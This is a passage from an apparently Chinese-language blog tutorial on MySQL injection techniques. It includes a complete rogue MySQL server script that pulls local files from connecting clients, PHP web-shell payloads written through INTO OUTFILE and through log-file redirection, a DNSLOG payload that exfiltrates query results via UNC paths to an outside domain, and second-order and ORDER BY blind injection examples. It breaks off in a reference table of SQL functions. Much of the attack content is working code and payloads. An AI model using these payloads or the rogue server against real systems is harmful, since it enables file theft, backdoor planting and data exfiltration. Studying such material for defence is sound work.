class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line">log.setLevel(logging.DEBUG)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(<span class="string">'mysql.log'</span>, <span class="string">'ab'</span>)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">"%(asctime)s:%(levelname)s:%(message)s"</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line"><span class="comment">#    r'c:\boot.ini',</span></span><br><span class="line">    <span class="string">r'c:\windows\win.ini'</span>,</span><br><span class="line"><span class="comment">#    r'c:\windows\system32\drivers\etc\hosts',</span></span><br><span class="line"><span class="comment">#    '/etc/passwd',</span></span><br><span class="line"><span class="comment">#    '/etc/shadow',</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Gifts'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">        warnings.warn(<span class="string">'Cant create daemon on non-posix system'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.open(<span class="string">'/dev/null'</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span><span class="params">(object)</span>:</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">'&lt;Hbb'</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">'&lt;Hbbb'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, packet_type, payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">"&#123;0&#125;&#123;1&#125;"</span>.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> repr(str(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">        packet_num = ord(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span><span class="params">(asynchat.async_chat)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">'LEN'</span></span><br><span class="line">        self.sub_state = <span class="string">'Auth'</span></span><br><span class="line">        self.logined = <span class="literal">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">""</span>.join((</span><br><span class="line">                    <span class="string">'\x0a'</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">'3.0.0-Evil_Mysql_Server'</span> + <span class="string">'\0'</span>,  <span class="comment"># Version</span></span><br><span class="line">                    <span class="comment">#'5.1.66-0+squeeze1' + '\0',</span></span><br><span class="line">                    <span class="string">'\x36\x00\x00\x00'</span>,  <span class="comment"># Thread ID</span></span><br><span class="line">                    <span class="string">'evilsalt'</span> + <span class="string">'\0'</span>,  <span class="comment"># Salt</span></span><br><span class="line">                    <span class="string">'\xdf\xf7'</span>,  <span class="comment"># Capabilities</span></span><br><span class="line">                    <span class="string">'\x08'</span>,  <span class="comment"># Collation</span></span><br><span class="line">                    <span class="string">'\x02\x00'</span>,  <span class="comment"># Server Status</span></span><br><span class="line">                    <span class="string">'\0'</span> * <span class="number">13</span>,  <span class="comment"># Unknown</span></span><br><span class="line">                    <span class="string">'evil2222'</span> + <span class="string">'\0'</span>,</span><br><span class="line">                ))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">'LOGIN'</span>, <span class="string">'CAPS'</span>, <span class="string">'ANY'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Pushed: %r'</span>, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Data recved: %r'</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'LEN'</span>:</span><br><span class="line">            len_bytes = ord(data[<span class="number">0</span>]) + <span class="number">256</span>*ord(data[<span class="number">1</span>]) + <span class="number">65536</span>*ord(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'MoreLength'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'MoreLength'</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">'\0'</span>:</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'Data'</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x03'</span>:</span><br><span class="line">                        log.info(<span class="string">'Query'</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xFB&#123;0&#125;'</span>.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">'LEN'</span></span><br><span class="line">                        self.sub_state = <span class="string">'File'</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x1b'</span>:</span><br><span class="line">                        log.info(<span class="string">'SelectDB'</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xfe\x00\x00\x02\x00'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'\x02'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">'\x00\x01'</span>:</span><br><span class="line">                        self.push(<span class="literal">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">'File'</span>:</span><br><span class="line">                        log.info(<span class="string">'-- result'</span>)</span><br><span class="line">                        log.info(<span class="string">'Result: %r'</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">'\0\0\0\x02\0\0\0'</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">'LEN'</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">'Auth'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">'-- else'</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">'Unknown packet'</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">'Last packet'</span>)</span><br><span class="line">                self.state = <span class="string">'LEN'</span></span><br><span class="line">                self.sub_state = <span class="literal">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">'Out of order'</span>)</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">'Unknown state'</span>)</span><br><span class="line">            self.push(<span class="string">'None'</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span><span class="params">(asyncore.dispatcher)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sock=None)</span>:</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">''</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span><span class="params">(self)</span>:</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            log.info(<span class="string">'Conn from: %r'</span>, pair[<span class="number">1</span>])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line">daemonize()</span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure><p>需要注意的是：这个过程需要客户端允许使用<code>load data local</code>才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。</p><p><img src="/img/loading.gif" alt="登录数据包" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/loginInfo.png"></p><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">select 2,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li><code>secure-file-priv</code>无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，mysql的权限足够。</li></ul><h4 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h4><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;请求日志</span><br><span class="line">mysql&gt; set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">mysql&gt; set global general_log &#x3D; on;</span><br><span class="line">&#x2F;&#x2F;慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php&#39;</span><br><span class="line">mysql&gt; set global slow_query_log&#x3D;1;</span><br><span class="line">&#x2F;&#x2F;还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h2 id="DNSLOG带出数据"><a href="#DNSLOG带出数据" class="headerlink" title="DNSLOG带出数据"></a>DNSLOG带出数据</h2><p>什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</p><p>如何用DNSLOG带出数据？若我们想要查询的数据为：<code>aabbcc</code>，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录<code>evil.com</code>的DNS记录，就可以得到数据：<code>aabbcc</code>。</p><blockquote><p><img src="/img/loading.gif" alt="DNSLOG流程图" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/dnslogSQLi.jpg"></p><p>引自：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></p></blockquote><p>payload: <code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code></p><p>应用场景：</p><ul><li>三大注入无法使用</li><li>有文件读取权限及<code>secure-file-priv</code>无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul><p>推荐平台：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a></p><p>为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以<code>\\</code>开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个<code>\\\\</code>中的两个<code>\</code>是用来进行转义处理的。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</p><p>举个例子，某个查询当先登录的用户信息的SQL语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;$_SESSION[&#39;username&#39;]&#39;</span><br></pre></td></tr></table></figure><p>登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</p><p>对于上述举的语句我们可以先注册一个名为<code>admin&#39; #</code>的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</p><p>在我们进行登录操作的时候，我们用注册的<code>admin&#39; #</code>登录系统，并将用户部分数据存储在对于的SESSION中，如<code>$_SESSION[&#39;username&#39;]</code>。</p><p>上述的<code>$_SESSION[&#39;username&#39;]</code>并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin&#39; #&#39;</span><br></pre></td></tr></table></figure><h2 id="order-by比较盲注"><a href="#order-by比较盲注" class="headerlink" title="order by比较盲注"></a>order by比较盲注</h2><p>这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where (select &#39;r&#39; union select user() order by 1 limit 1)&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>如果能一眼看出原理的话就不需要继续看下去了。</p><p>实际上此处是利用了<code>order by</code>语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则<code>limit</code>语句将不会让其输出，那么整个条件将会成立，否之不成立。</p><p>利用这种方法可以做到不需要使用<code>like、rlike、regexp</code>等匹配语句以及字符操作函数。</p><p>再举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username&#x3D;&#39;$username;&#39;</span><br></pre></td></tr></table></figure><p>页面回显的字段为：username与password，如何在<code>union</code>与<code>flag</code>两单词被拦截、无报错信息返回的情况下获取到用户名为<code>admin</code>的flag值？</p><p>我们前边讲到了无列名注入，通过使用<code>union</code>语句来对未知列名进行重命名的形式绕过，还讲过通过使用<code>join using()</code>报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</p><p>使用<code>order by</code>可轻松盲注出答案。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,flag,password from users where username&#x3D;&#39;admin&#39; union select 1,&#39;a&#39;,3 order by 2</span><br></pre></td></tr></table></figure><p>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</p><h2 id="常见函数-符号归类"><a href="#常见函数-符号归类" class="headerlink" title="常见函数/符号归类"></a>常见函数/符号归类</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><table><thead><tr><th>单行注释</th><th>单行注释</th><th>单行注释</th><th>多行(内联)注释</th></tr></thead><tbody><tr><td><code>#</code></td><td><code>-- x  //x为任意字符</code></td><td><code>;%00</code></td><td><code>/*任意内容*/</code></td></tr></tbody></table><h3 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h3><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>与，同and。</td><td>丨丨</td><td>或，同or。注：此处由于markdown语法限制，用中文符号代替显示。</td></tr><tr><td><code>!</code></td><td>非，同not。</td><td><code>~</code></td><td>一元比特反转。</td></tr><tr><td><code>^</code></td><td>异或，同xor。</td><td><code>+</code></td><td>加，可替代空格，如<code>select+user()</code>。</td></tr></tbody></table><h3 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同SCHEMA()。</td></tr><tr><td>VERSION()</td><td>获取当前版本信息。</td></tr></tbody></table><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值。</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 